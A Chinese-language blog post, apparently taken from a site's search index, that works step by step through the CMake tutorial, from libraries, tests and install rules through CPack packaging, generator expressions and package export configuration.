standardset(CMAKE_CXX_STANDARD 11)set(CMAKE_CXX_STANDARD_REQUIRED True) CMAKE_CXX_STANDARD 生命必须放在 add_executable 之前 构建并测试首先构建 1234mkdir step1_buildcd step1_buildcmake ..cmake --build . 然后测试 123Tutorial 4294967296Tutorial 10Tutorial 添加一个库我们将向项目中添加一个库。这个库将包含了自定义的平方根函数的实现。之后，在可执行文件中使用用这个库，替换编译器提供的标准平方根函数。 新建MathFunctions目录，在其下添加CMakeLists.txt,添加如下内容: 1add_library(MathFunctions mysqrt.cxx) mysqrt.cxx如下： 1234567891011121314151617181920212223#include &lt;iostream&gt;// a hack square root calculation using simple operationsdouble mysqrt(double x) { if (x &lt;= 0) { return 0; } double result = x; // do ten iterations for (int i = 0; i &lt; 10; ++i) { if (result &lt;= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout &lt;&lt; &quot;Computing sqrt of &quot; &lt;&lt; x &lt;&lt; &quot; to be &quot; &lt;&lt; result &lt;&lt; std::endl; } return result;} 为了使用新库，我们将在顶层的CMakeLists.txt文件中添加一个add subdirectory()调用，以便构建库。我们将新库添加到可执行文件中，并将MathFunctions添加为 include 目录，以便可以找到mqsqrt.h头文件。顶层的CMakeLists.txt文件的最后几行现在看起来应该是这样的： 1234567891011121314# add the MathFunctions libraryadd_subdirectory(MathFunctions)# add the executableadd_executable(Tutorial tutorial.cxx)target_link_libraries(Tutorial PUBLIC MathFunctions)# add the binary tree to the search path for include files# so that we will find TutorialConfig.htarget_include_directories(Tutorial PUBLIC &quot;${PROJECT_BINARY_DIR}&quot; &quot;${PROJECT_SOURCE_DIR}/MathFunctions&quot; ) 现在让我们把 MathFunctions 库变成可选的。虽然对于本教程来说，没有必要这样做，但对于大型项目来说，这是一种常见的情况。第一步是在顶层的 CMakeLists.txt 文件中添加一个选项（option放在configure_file前面）: 12345option(USE_MYMATH &quot;Use tutorial provided math implementation&quot; ON)# configure a header file to pass some of the CMake settings# to the source codeconfigure_file(TutorialConfig.h.in TutorialConfig.h) 这个选项会在 cmake-gui 和 ccmake 中显示，默认值为 ON，用户可以更改。这个设置将被保存在缓存中，这样用户就不需要在每次运行 CMake 的时候设置这个值。 下一个步是使构建和链接MathFunctions库成为条件判断的。要做到这一点，我们将顶层CMakeLists.txt文件的结尾改为如下所示: 1234567891011121314151617if(USE_MYMATH) add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) list(APPEND EXTRA_INCLUDES &quot;${PROJECT_SOURCE_DIR}/MathFunctions&quot;)endif()# add the executableadd_executable(Tutorial tutorial.cxx)target_link_libraries(Tutorial PUBLIC ${EXTRA_LIBS})# add the binary tree to the search path for include files# so that we will find TutorialConfig.htarget_include_directories(Tutorial PUBLIC &quot;${PROJECT_BINARY_DIR}&quot; ${EXTRA_INCLUDES} ) 请注意使用变量EXTRA_LIBS来收集任何可选的库，以便以后链接到可执行文件中。变量EXTRA_INCLUDES也同样用于处理可选的头文件。这是在处理许多可选组件时的传统方法，下一步讲介绍更为现代化方法。 相应的，需要简单修改源代码。首先，在tutorial.cxx中，如果我们需要的话，就加入MathFunctions.h头文件： 123#ifdef USE_MYMATH# include &quot;MathFunctions.h&quot;#endif 然后，使用USE_MYMATH控制库函数的调用： 12345#ifdef USE_MYMATH const double outputValue = mysqrt(inputValue);#else const double outputValue = sqrt(inputValue);#endif 由于源代码现在需要 USE_MYMATH， 我们可以在 TutorialConfig.h.in中加入下面这行: 1#cmakedefine USE_MYMATH 接下来，在构建时，可以使用-D添加使用选项，例如要关闭选项，使用： 1cmake .. -DUSE_MYMATH=OFF 添加库的使用条件使用条件允许更好地控制库或可执行文件的链接和include行，同时也给予 CMake 内部 target 的转义属性更多的控制。利用使用条件的主要命令有: target_compile_definitions() target_compile_options() target_include_directories() target_link_libraries() 让我们从步骤 2 开始中重构我们的代码，使用现代 CMake 的使用条件方法。我们首先声明，任何人链接到MathFunctions都需要包含当前目录，而MathFunctions本身不需要。所以这可以成为一个INTERFACE的使用条件。 记住，INTERFACE是指使用者需要而提供者不需要的东西。在MathFunctions/CMakeLists.txt的末尾添加以下几行: 123target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) 现在我们已经指定了 MathFunctions的使用条件，我们可以安全地从顶层的 CMakeLists.txt中删除对 EXTRA_INCLUDES 变量的使用。 此处 12345if(USE_MYMATH) # add the MathFunctions library add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions)endif() 和此处 123target_include_directories(Tutorial PUBLIC &quot;${PROJECT_BINARY_DIR}&quot; ) 之后便可以重新构建项目了。 安装和测试现在我们可以开始为我们的项目添加安装规则和测试支持。 安装规则安装规则相当简单：对于MathFunctions，我们要安装库和头文件，对于应用程序，我们要安装可执行文件和配置的头文件。 所以在MathFunctions/CMakeLists.txt中添加： 12install(TARGETS MathFunctions DESTINATION lib)install(FILES MathFunctions.h DESTINATION include) 在顶层的CMakeLists.txt中 添加： 1234install(TARGETS Tutorial DESTINATION bin)install(FILES &quot;${PROJECT_BINARY_DIR}/TutorialConfig.h&quot; DESTINATION include ) 这就是为tutorial创建一个基本的本地安装所需要的全部内容。 现在重新来配置项目并构建它。然后在命令行使用cmake 命令的install 选项来运行安装步骤 (在 3.15 中引入，旧版本的 CMake 必须使用 make install)。对于多配置工具，不要忘记使用–config 参数来指定配置。如果使用 IDE，只需构建INSTALL target。这一步将安装相应的头文件、库和可执行文件。例如: 1cmake --install . CMake 变量 CMAKE_INSTALL_PREFIX 用于确定文件安装的根目录。如果使用 cmake --install 命令，安装目录可以通过 --prefix参数重写。例如： 1cmake --install . --prefix &quot;/home/myuser/installdir&quot; 测试支持接下来，测试我们的应用程序。在顶层的CMakeLists.txt文件的末尾，我们可以启用测试，然后添加一些基本测试以验证应用程序是否正常运行。 123456789101112131415161718192021222324252627enable_testing()# does the application runadd_test(NAME Runs COMMAND Tutorial 25)# does the usage message work?add_test(NAME Usage COMMAND Tutorial)set_tests_properties(Usage PROPERTIES PASS_REGULAR_EXPRESSION &quot;Usage:.*number&quot; )# define a function to simplify adding testsfunction(do_test target arg result) add_test(NAME Comp${arg} COMMAND ${target} ${arg}) set_tests_properties(Comp${arg} PROPERTIES PASS_REGULAR_EXPRESSION ${result} )endfunction(do_test)# do a bunch of result based testsdo_test(Tutorial 4 &quot;4 is 2&quot;)do_test(Tutorial 9 &quot;9 is 3&quot;)do_test(Tutorial 5 &quot;5 is 2.236&quot;)do_test(Tutorial 7 &quot;7 is 2.645&quot;)do_test(Tutorial 25 &quot;25 is 5&quot;)do_test(Tutorial -25 &quot;-25 is [-nan|nan|0]&quot;)do_test(Tutorial 0.0001 &quot;0.0001 is 0.01&quot;) 第一个测试只是简单地验证应用程序是否运行，没有 segfault 或其他崩溃，并且返回值为零。这是 CTest 测试的基本形式。 下一个测试利用PASS_REGULAR_EXPRESSION测试属性来验证测试的输出是否包含某些字符串。在这种情况下，验证当提供的参数数量不正确时，是否会打印出使用信息。 最后，我们有一个名为 do_test 的函数，它运行应用程序并验证给定输入的计算平方根是否正确。每调用一次do_test，就会在项目中添加一个测试，包括名称、输入和基于传递的参数的预期结果。 重新构建应用程序，然后 cd 到二进制目录，运行ctest可执行文件：ctest -N（--show-only[=format]）和ctest -VV（--extra-verbose）。对于多配置生成器（如 Visual Studio），必须指定配置类型。例如，要在 Debug 模式下运行测试，从构建目录中使用ctest -C Debug -VV（不是 Debug 子目录！）。或者，从 IDE 中构建RUN_TESTS目标。 添加系统自检让我们考虑在我们的项目中添加一些代码，这些代码取决于目标平台可能没有的功能。在这个例子中，我们将添加一些代码，这些代码取决于目标平台是否有 log 和 exp 函数。当然，几乎每个平台都有这些函数，但在本教程中，假设它们并不常见。 如果平台上有 log 和 exp，那么我们将使用它们来计算 mysqrt 函数中的平方根。我们首先使用顶层CMakeLists.txt中的CheckSymbolExists模块测试这些函数是否可用。在某些平台上，我们需要链接到m库。如果最初没有找到log和exp，则需要使用m库并再次尝试。 我们将使用TutorialConfig.h.in中的新定义，所以一定要在配置该文件之前设置它们。 如果系统上有log和exp，那么我们将在mysqrt函数中使用它们来计算平方根。在MathFunctions/mysqrt.cxx中的mysqrt函数中添加以下代码（在返回结果之前不要忘记#endif！）。 重新构建项目，会发现无论平台上是否有log和exp，都不会调用它们。因为我们忘记了在mysqrt.cxx中 include TutorialConfig.h。现在更新 我们还需要更新MathFunctions / CMakeLists.txt，以便mysqrt.cxx知道此文件的位置： 1234target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_BINARY_DIR} ) 指定编译定义除了在TutorialConfig.h中保存HAVE_LOG和HAVE_EXP值，我们还有更好的方法吗？让我们尝试使用target_compile_definitions()。 首先，从TutorialConfig.h.in中删除定义。我们不再需要在mysqrt.cxx中 include TutorialConfig.h或MathFunctions/CMakeLists.txt中的其他 include 内容。 接下来，我们可以将HAVE_LOG和HAVE_EXP的检查移至MathFunctions/CMakeLists.txt，然后将这些值指定为PRIVATE编译定义。 12345678910111213141516171819include(CheckSymbolExists)check_symbol_exists(log &quot;math.h&quot; HAVE_LOG)check_symbol_exists(exp &quot;math.h&quot; HAVE_EXP)if(NOT (HAVE_LOG AND HAVE_EXP)) unset(HAVE_LOG CACHE) unset(HAVE_EXP CACHE) set(CMAKE_REQUIRED_LIBRARIES &quot;m&quot;) check_symbol_exists(log &quot;math.h&quot; HAVE_LOG) check_symbol_exists(exp &quot;math.h&quot; HAVE_EXP) if(HAVE_LOG AND HAVE_EXP) target_link_libraries(MathFunctions PRIVATE m) endif()endif()# add compile definitionsif(HAVE_LOG AND HAVE_EXP) target_compile_definitions(MathFunctions PRIVATE &quot;HAVE_LOG&quot; &quot;HAVE_EXP&quot;)endif() 之后再重新构建并运行项目，查看结果。 添加自定义命令和生成的文件假设，作为本教程的目的，我们决定永远不要使用平台提供的log和exp函数，而是想生成一个预计算值的表，以便在mysqrt函数中使用。在本节中，我们将创建该表作为构建过程的一部分，然后将该表编译到我们的应用程序中。 首先，让我们删除MathFunctions/CMakeLists.txt中对log和exp函数的检查。然后从mysqrt.cxx中删除对HAVE_LOG和HAVE_EXP的检查。同时，我们可以删除#include 。 在MathFunctions子目录中，提供了一个名为MakeTable.cxx的新源文件来生成表。 查看完文件后，我们可以看到该表是作为有效的 C ++代码生成的，并且输出文件名作为参数传入。 123456789101112131415161718192021222324// A simple program that builds a sqrt table#include &lt;cmath&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) { // make sure we have enough arguments if (argc &lt; 2) { return 1; } std::ofstream fout(argv[1], std::ios_base::out); const bool fileOpen = fout.is_open(); if (fileOpen) { fout &lt;&lt; &quot;double sqrtTable[] = {&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 10; ++i) { fout &lt;&lt; sqrt(static_cast&lt;double&gt;(i)) &lt;&lt; &quot;,&quot; &lt;&lt; std::endl; } // close the table with a zero fout &lt;&lt; &quot;0};&quot; &lt;&lt; std::endl; fout.close(); } return fileOpen ? 0 : 1; // return 0 if wrote the file} 下一步是将适当的命令添加到MathFunctions/CMakeLists.txt文件中，以构建MakeTable可执行文件，然后在构建过程中运行它。需要一些命令来完成此操作。 首先，在MathFunctions/CMakeLists.txt的顶部，添加MakeTable的可执行文件，就像添加任何其他可执行文件一样。 1add_executable(MakeTable MakeTable.cxx) 然后，我们添加一个自定义命令，该命令指定如何通过运行MakeTable来产生Table.h。 12345add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) 接下来，我们必须让 CMake 知道mysqrt.cxx如何依赖生成的文件Table.h。通过将生成的Table.h添加到库MathFunctions的源列表中，可以完成此操作。 1234add_library(MathFunctions mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) 我们还必须将当前的二进制目录添加到包含目录列表中，以便mysqrt.cxx可以找到并包含Table.h。 1234target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) 现在，我们使用生成的表。首先，修改mysqrt.cxx以包含Table.h。接下来，我们可以重写mysqrt函数以使用该表： 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &quot;MathFunctions.h&quot;#include &quot;Table.h&quot;double mysqrt(double x) { if (x &lt;= 0) { return 0; } // use the table to help find an initial value double result = x; if (x &gt;= 1 &amp;&amp; x &lt; 10) { std::cout &lt;&lt; &quot;Use the table to help find an initial value &quot; &lt;&lt; std::endl; result = sqrtTable[static_cast&lt;int&gt;(x)]; } // do ten iterations for (int i = 0; i &lt; 10; ++i) { if (result &lt;= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout &lt;&lt; &quot;Computing sqrt of &quot; &lt;&lt; x &lt;&lt; &quot; to be &quot; &lt;&lt; result &lt;&lt; std::endl; } return result;} 构建此项目时，它将首先构建MakeTable可执行文件。然后它将运行MakeTable生成Table.h。最后，它将编译包括Table.h的mysqrt.cxx，以生成MathFunctions库。 做完这些更新后，再继续构建项目。运行构建好的 Tutorial 可执行文件，并验证结果是否与前面相同。 构建安装程序接下来假设我们想把我们的项目发布给其他人，以便他们能够使用它。我们希望在不同的平台上提供二进制和源代码的发布。这与我们之前在安装和测试（第 4 步）中所做的安装有些不同，在这里我们安装的是我们从源代码中构建的二进制文件。在这个例子中，我们将构建支持二进制安装和包管理功能的安装包。为了完成这个任务，我们将使用CPack来创建特定平台的安装包。具体来说，我们需要在顶层CMakeLists.txt文件的底部添加几行内容: 12345include(InstallRequiredSystemLibraries)set(CPACK_RESOURCE_FILE_LICENSE &quot;${CMAKE_CURRENT_SOURCE_DIR}/License.txt&quot;)set(CPACK_PACKAGE_VERSION_MAJOR &quot;${Tutorial_VERSION_MAJOR}&quot;)set(CPACK_PACKAGE_VERSION_MINOR &quot;${Tutorial_VERSION_MINOR}&quot;)include(CPack) 首先包含InstallRequiredSystemLibraries。这个模块将包含项目在当前平台上需要的任何运行时库。接下来，我们设置一些CPack变量，将这个项目的许可证和版本信息存储在那里。版本信息在本教程的前面已经设置好了，license.txt已经包含在本步骤的顶层源目录中: 12This is the open source License.txt file introduced inCMake/Tutorial/Step7... 最后我们加入CPack模块，它将使用这些变量和当前系统的一些其他属性来设置安装程序。 下一步是以通常的方式构建项目，然后运行cpack可执行文件。要构建一个二进制发行版，请在二进制目录下运行。 要指定生成器，请使用-G选项。对于多配置的构建，使用-C来指定配置。例如： 1cpack -G ZIP -C Debug 要创建一个源码分发，可以输入： 1cpack --config CPackSourceConfig.cmake 或者，运行make package或右键点击Package target 并从 IDE 中构建项目。 运行在二进制目录下找到的安装程序。然后运行已安装的可执行文件，并验证它是否工作。 添加 DashBoard 支持添加支持将我们的测试结果提交到 dashboard 很简单。我们已经为我们的项目定义了一些测试。现在我们只需要运行这些测试并将它们提交到仪表板。为了包含对仪表盘的支持，我们在顶层的CMakeLists.txt中加入了CTest模块: 将enable_testing()替换为include(CTest)。 CTest模块会自动调用enable_testing()，所以我们可以从CMake文件中删除它。 我们还需要在顶层目录下创建一个CTestConfig.cmake文件，在这里我们可以指定项目的名称和提交dashboard的位置。 1234567set(CTEST_PROJECT_NAME &quot;CMakeTutorial&quot;)set(CTEST_NIGHTLY_START_TIME &quot;00:00:00 EST&quot;)set(CTEST_DROP_METHOD &quot;http&quot;)set(CTEST_DROP_SITE &quot;my.cdash.org&quot;)set(CTEST_DROP_LOCATION &quot;/submit.php?project=CMakeTutorial&quot;)set(CTEST_DROP_SITE_CDASH TRUE) 当ctest可执行文件运行时，它将读取这个文件。要创建一个简单的 dashboard，你可以运行cmake可执行文件或cmake-gui来配置项目，但先不要构建它。切换到二叉树状目录，然后运行。 1ctest [-VV] -D Experimental 请记住，对于多配置生成器（如 Visual Studio），必须指定配置类型。 混合静态和共享在这一节中，将展示如何使用BUILD_SHARED_LIBS变量来控制add_library()的默认行为，并允许控制没有明确类型(STATIC, SHARED, MODULE or OBJECT)的库的构建方式。 为了达到这个目的，我们需要在顶层的CMakeLists.txt中添加BUILD_SHARED_LIBS。我们使用option()命令，因为它允许用户选择性地选择该值是否应该是 ON 或 OFF。 接下来我们将重构 MathFunctions， 使其成为一个真正的库， 封装使用 mysqrt 或 sqrt， 而不是要求调用代码来完成这个逻辑。这也意味着 USE_MYMATH将不会控制构建 MathFunctions，而是控制这个库的行为。 第一步是更新顶层CMakeLists.txt的起始部分， 使其看起来像这样: 1234567891011121314151617181920212223242526cmake_minimum_required(VERSION 3.10)# set the project name and versionproject(Tutorial VERSION 1.0)# specify the C++ standardset(CMAKE_CXX_STANDARD 11)set(CMAKE_CXX_STANDARD_REQUIRED True)# control where the static and shared libraries are built so that on windows# we don't need to tinker with the path to run the executableset(CMAKE_ARCHIVE_OUTPUT_DIRECTORY &quot;${PROJECT_BINARY_DIR}&quot;)set(CMAKE_LIBRARY_OUTPUT_DIRECTORY &quot;${PROJECT_BINARY_DIR}&quot;)set(CMAKE_RUNTIME_OUTPUT_DIRECTORY &quot;${PROJECT_BINARY_DIR}&quot;)option(BUILD_SHARED_LIBS &quot;Build using shared libraries&quot; ON)# configure a header file to pass the version number onlyconfigure_file(TutorialConfig.h.in TutorialConfig.h)# add the MathFunctions libraryadd_subdirectory(MathFunctions)# add the executableadd_executable(Tutorial tutorial.cxx)target_link_libraries(Tutorial PUBLIC MathFunctions) 现在我们已经让MathFunctions始终被使用，接下来需要更新该库的逻辑。因此， 在 MathFunctions/CMakeLists.txt中， 我们需要创建一个 SqrtLibrary， 当 USE_MYMATH 启用时， 这个SqrtLibrary将有条件地被构建和安装。由于这是一个教程， 我们将明确要求静态地构建 SqrtLibrary。 最终的结果是MathFunctions/CMakeLists.txt 应该是这样的: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# add the library that runsadd_library(MathFunctions MathFunctions.cxx)# state that anybody linking to us needs to include the current source dir# to find MathFunctions.h, while we don't.target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} )# should we use our own math functionsoption(USE_MYMATH &quot;Use tutorial provided math implementation&quot; ON)if(USE_MYMATH) target_compile_definitions(MathFunctions PRIVATE &quot;USE_MYMATH&quot;) # first we add the executable that generates the table add_executable(MakeTable MakeTable.cxx) # add the command to generate the source code add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) # library that just does sqrt add_library(SqrtLibrary STATIC mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) # state that we depend on our binary dir to find Table.h target_include_directories(SqrtLibrary PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) target_link_libraries(MathFunctions PRIVATE SqrtLibrary)endif()# define the symbol stating we are using the declspec(dllexport) when# building on windowstarget_compile_definitions(MathFunctions PRIVATE &quot;EXPORTING_MYMATH&quot;)# install rulesset(installable_libs MathFunctions)if(TARGET SqrtLibrary) list(APPEND installable_libs SqrtLibrary)endif()install(TARGETS ${installable_libs} DESTINATION lib)install(FILES MathFunctions.h DESTINATION include) 接下来，更新 MathFunctions/mysqrt.cxx，使用 mathfunctions和 detail 命名空间。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &quot;MathFunctions.h&quot;#include &quot;Table.h&quot;namespace mathfunctions {namespace detail {double mysqrt(double x) { if (x &lt;= 0) { return 0; } double result = x; if (x &gt;= 1 &amp;&amp; x &lt; 10) { std::cout &lt;&lt; &quot;Use the table to help find an initial value &quot; &lt;&lt; std::endl; result = sqrtTable[static_cast&lt;int&gt;(x)]; } // do ten iterations for (int i = 0; i &lt; 10; ++i) { if (result &lt;= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout &lt;&lt; &quot;Computing sqrt of &quot; &lt;&lt; x &lt;&lt; &quot; to be &quot; &lt;&lt; result &lt;&lt; std::endl; } return result;}} // namespace detail} // namespace mathfunctions 我们还需要在 tutorial.cxx中做一些修改， 使它不再使用 USE_MYMATH: 始终 include MathFunctions.h 始终使用 mathfunctions::sqrt 不要 include cmath mysqrt.h如下： 123456namespace mathfunctions {namespace detail {double mysqrt(double x);}} // namespace mathfunctions MathFunctions.cxx如下： 123456789101112131415161718#include &quot;MathFunctions.h&quot;#include &lt;cmath&gt;#ifdef USE_MYMATH#include &quot;mysqrt.h&quot;#endifnamespace mathfunctions {double sqrt(double x) {#ifdef USE_MYMATH return detail::mysqrt(x);#else return std::sqrt(x);#endif}} // namespace mathfunctions 最后，更新MathFunctions/MathFunctions.h，使用 dll 导出定义： 12345678910111213#if defined(_WIN32)#if defined(EXPORTING_MYMATH)#define DECLSPEC __declspec(dllexport)#else#define DECLSPEC __declspec(dllimport)#endif#else // non windows#define DECLSPEC#endifnamespace mathfunctions {double DECLSPEC sqrt(double x);} 此时，如果你构建了所有的东西，你可能会注意到链接失败，因为我们将一个没有地址无关代码的静态库与一个有地址无关的库结合在一起。解决这个问题的方法是，无论构建类型如何，都要显式地将SqrtLibrary的POSITION_INDEPENDENT_CODE目标属性设置为 True。 123456# state that SqrtLibrary need PIC when the default is shared librariesset_target_properties(SqrtLibrary PROPERTIES POSITION_INDEPENDENT_CODE ${BUILD_SHARED_LIBS} )target_link_libraries(MathFunctions PRIVATE SqrtLibrary) 添加生成器表达式在构建系统生成期间会执行Generator expression，以生成特定于每个构建配置的信息。 在许多目标属性（例如LINK_LIBRARIES，INCLUDE_DIRECTORIES，COMPLIE_DEFINITIONS等）的上下文中允许Generator expression。在使用命令填充这些属性（例如target_link_libraries()，target_include_directories()，target_compile_definitions()等）时，也可以使用它们。 Generator expression可用于启用条件链接、编译时使用的条件定义、条件 include 目录等。这些条件可以基于构建配置、目标属性、平台信息或任何其他可查询的信息。 有不同类型的Generator expression，包括逻辑表达式、信息表达式和输出表达式。 逻辑表达式用于创建条件输出。基本的表达式是 0 和 1 表达式。$&lt;0:...&gt;的结果是空字符串，&lt;1:...&gt;的结果是&quot;... &quot;的内容。它们也可以嵌套。 Generator expression的一个常见用法是有条件地添加编译器标志，例如语言级别或警告的标志。一个很好的模式是将这些信息关联到一个INTERFACE目标，允许这些信息传播。让我们从构造一个INTERFACE目标开始，并指定所需的 C++标准为 11，而不是使用CMAKE_CXX_STANDARD。 原代码如下： 123# specify the C++ standardset(CMAKE_CXX_STANDARD 11)set(CMAKE_CXX_STANDARD_REQUIRED True) 替换为： 12add_library(tutorial_compiler_flags INTERFACE)target_compile_features(tutorial_compiler_flags INTERFACE cxx_std_11) 接下来，我们为项目添加所需的编译器警告标志。由于警告标志因编译器而异，因此我们使用COMPILE_LANG_AND_ID生成器表达式来控制在给定语言和一组编译器 ID 的情况下应应用的标志，如下所示： 123456set(gcc_like_cxx &quot;$&lt;COMPILE_LANG_AND_ID:CXX,ARMClang,AppleClang,Clang,GNU&gt;&quot;)set(msvc_cxx &quot;$&lt;COMPILE_LANG_AND_ID:CXX,MSVC&gt;&quot;)target_compile_options(tutorial_compiler_flags INTERFACE &quot;$&lt;${gcc_like_cxx}:$&lt;BUILD_INTERFACE:-Wall;-Wextra;-Wshadow;-Wformat=2;-Wunused&gt;&gt;&quot; &quot;$&lt;${msvc_cxx}:$&lt;BUILD_INTERFACE:-W3&gt;&gt;&quot;) 查看此内容，我们看到警告标志封装在BUILD_INTERFACE条件内。这样做是为了使我们已安装项目的使用者不会继承我们的警告标志。 添加导出配置在教程的“安装和测试”中，我们添加了 CMake 安装项目的库和头文件的功能。在”构建安装程序“期间，我们添加了打包这些信息的功能，以便可以将其分发给其他人。 下一步是添加必要的信息，以便其他 CMake 项目可以使用我们的项目，无论是从构建目录，本地安装还是打包时。 第一步是更新我们的install（TARGETS）命令，不仅要指定DESTINATION，还要指定EXPORT。 EXPORT关键字生成并安装一个CMake文件，该文件包含用于从安装树中导入install命令中列出的所有目标的代码。因此，让我们继续，通过更新MathFunctions/CMakeLists.txt中的install命令，显式导出MathFunctions库，如下所示： 现在我们已经导出了MathFunctions，我们还需要显式安装生成的MathFunctionsTargets.cmake文件。通过将以下内容添加到顶层的CMakeLists.txt的底部来完成： 1234install(EXPORT MathFunctionsTargets FILE MathFunctionsTargets.cmake DESTINATION lib/cmake/MathFunctions) 然后尝试构建项目，应该会遇到类似下面的错误： 1234567CMake Error in MathFunctions/CMakeLists.txt: Target &quot;MathFunctions&quot; INTERFACE_INCLUDE_DIRECTORIES property contains path: &quot;/Users/wmc/vscode/cmake/tutorial/MathFunctions&quot; which is prefixed in the source directory. CMake 试图说的是，在生成导出信息的过程中，它将导出与当前机器上的绝对路径，在其他机器上无效。解决方案是更新MathFunctions的 target_include_directories()，以让 CMake 了解当从构建目录内和从安装/包中使用时，它需要不同的 INTERFACE 位置。这意味着将MathFunctions的target_include_directories()调用转换为如下样子: 12345target_include_directories(MathFunctions INTERFACE $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}&gt; $&lt;INSTALL_INTERFACE:include&gt; ) 修改后重新运行 CMake，应该不会再有警告了。 此时，我们已经让 CMake 正确地打包了所需的目标信息，但我们仍然需要生成一个MathFunctionsConfig.cmake，这样CMake find_package()命令才能找到我们的项目。所以我们继续在项目的顶层添加一个新文件，名为Config.cmake.in，内容如下。 123@PACKAGE_INIT@include ( &quot;${CMAKE_CURRENT_LIST_DIR}/MathFunctionsTargets.cmake&quot; ) 然后，为了正确配置和安装该文件，在顶层CMakeLists.txt的底部添加以下内容: 1234567891011121314151617181920include(CMakePackageConfigHelpers)# generate the config file that is includes the exportsconfigure_package_config_file(${CMAKE_CURRENT_SOURCE_DIR}/Config.cmake.in &quot;${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake&quot; INSTALL_DESTINATION &quot;lib/cmake/example&quot; NO_SET_AND_CHECK_MACRO NO_CHECK_REQUIRED_COMPONENTS_MACRO )# generate the version file for the config filewrite_basic_package_version_file( &quot;${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfigVersion.cmake&quot; VERSION &quot;${Tutorial_VERSION_MAJOR}.${Tutorial_VERSION_MINOR}&quot; COMPATIBILITY AnyNewerVersion)# install the configuration fileinstall(FILES ${CMAKE_CURRENT_BINARY_DIR}/MathFunctionsConfig.cmake DESTINATION lib/cmake/MathFunctions ) 此时，我们已经为我们的项目生成了一个可重定位的 CMake 配置，可以在项目安装或打包后使用。如果我们希望我们的项目也能在构建目录下使用，我们只需要在顶层 CMakeLists.txt的底部添加以下内容: 通过这个export调用，我们现在可以生成一个Targets.cmake，允许构建目录下配置的MathFunctionsConfig.cmake被其他项目使用，而不需要安装它。 打包 Debug 和 Release注意：这个例子对单配置生成器有效，对多配置生成器（如 Visual Studio）无效。 默认情况下，CMake 的模型是一个构建目录只包含一个配置，无论是 Debug、Release、MinSizeRel，还是 RelWithDebInfo。然而，我们可以设置 CPack 来捆绑多个构建目录，并构建一个包含同一项目多个配置的包。 首先，我们要确保 Debug 版本和 Release 版本构建的可执行文件和库使用不同的名称。让我们使用 d 作为 Debug 版可执行文件和库的后缀。 在顶层的CMakeLists.txt文件开始处添加： 123set(CMAKE_DEBUG_POSTFIX d)add_library(tutorial_compiler_flags INTERFACE) 以及TUtorial可执行文件上的 DEBUG_POSTFIX 属性: 1234add_executable(Tutorial tutorial.cxx)set_target_properties(Tutorial PROPERTIES DEBUG_POSTFIX ${CMAKE_DEBUG_POSTFIX})target_link_libraries(Tutorial PUBLIC MathFunctions) 我们也给MathFunctions库添加版本号。在MathFunctions/CMakeLists.txt中，设置VERSION和SOVERSION属性: 12set_property(TARGET MathFunctions PROPERTY VERSION &quot;1.0.0&quot;)set_property(TARGET MathFunctions PROPERTY SOVERSION &quot;1&quot;) 在项目根目录下： 1mkdir -p step12_build/{debug,release} 现在我们需要设置 debug 和 release 版本。我们可以使用CMAKE_BUILD_TYPE来设置配置类型： 123456cd debugcmake -DCMAKE_BUILD_TYPE=Debug ../..cmake --build .cd ../releasecmake -DCMAKE_BUILD_TYPE=Release ../..cmake --build . 现在调试和发行版的构建都已经完成，我们可以使用一个自定义的配置文件将两个构建打包成一个发行版。在 step12_build 目录下，创建一个名为MultiCPackConfig.cmake的文件。在这个文件中，首先包含 cmake 可执行文件创建的默认配置文件 接下来，使用CPACK_INSTALL_CMAKE_PROJECTS变量来指定要安装的项目。在本例中，我们希望同时安装 debug 和 release 版本： 123456include(&quot;release/CPackConfig.cmake&quot;)set(CPACK_INSTALL_CMAKE_PROJECTS &quot;debug;Tutorial;ALL;/&quot; &quot;release;Tutorial;ALL;/&quot; ) 在 step12_build 目录下，运行cpack，用config选项指定我们的自定义配置文件: 1cpack --config MultiCPackConfig.cmake","link":"/2020/10/29/CMake-Tutorial/"}],"tags":[{"name":"面经","slug":"面经","link":"/tags/%E9%9D%A2%E7%BB%8F/"},{"name":"后端","slug":"后端","link":"/tags/%E5%90%8E%E7%AB%AF/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"6.S081","slug":"6-S081","link":"/tags/6-S081/"},{"name":"mmap","slug":"mmap","link":"/tags/mmap/"},{"name":"page table","slug":"page-table","link":"/tags/page-table/"},{"name":"traps","slug":"traps","link":"/tags/traps/"},{"name":"lazy allocation","slug":"lazy-allocation","link":"/tags/lazy-allocation/"},{"name":"cow","slug":"cow","link":"/tags/cow/"},{"name":"Multithreading","slug":"Multithreading","link":"/tags/Multithreading/"},{"name":"lock","slug":"lock","link":"/tags/lock/"},{"name":"file 